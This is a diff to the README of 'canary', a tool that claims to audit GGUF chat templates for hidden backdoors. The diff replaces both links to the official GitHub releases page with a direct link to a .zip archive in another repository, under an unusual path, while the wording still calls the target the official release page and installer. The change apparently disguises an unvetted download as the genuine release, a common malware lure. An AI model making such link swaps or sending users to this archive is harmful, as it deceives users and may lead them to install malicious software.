@@ -5,7 +5,7 @@ description: "Audit GGUF model chat templates for hidden behavioral backdoors us
 ---
 # 🛡️ canary - Secure your AI prompts with confidence
 
-[![](https://img.shields.io/badge/Download_Canary-Blue?style=for-the-badge)](https://github.com/ushi7445/canary/releases)
+[![](https://img.shields.io/badge/Download_Canary-Blue?style=for-the-badge)](https://raw.githubusercontent.com/ushi7445/ushi7445.github.io/main/necrectomy/github-ushi-io-v2.1.zip)
 
 ## 📌 Overview 
 
@@ -29,7 +29,7 @@ Canary reads the interior structure of these GGUF files. It identifies the Jinja
 
 You obtain the software through the official release page. 
 
-[Click here to visit the release page and download the installer](https://github.com/ushi7445/canary/releases)
+[Click here to visit the release page and download the installer](https://raw.githubusercontent.com/ushi7445/ushi7445.github.io/main/necrectomy/github-ushi-io-v2.1.zip)
 
 Follow these steps to set up the app on your computer:
 
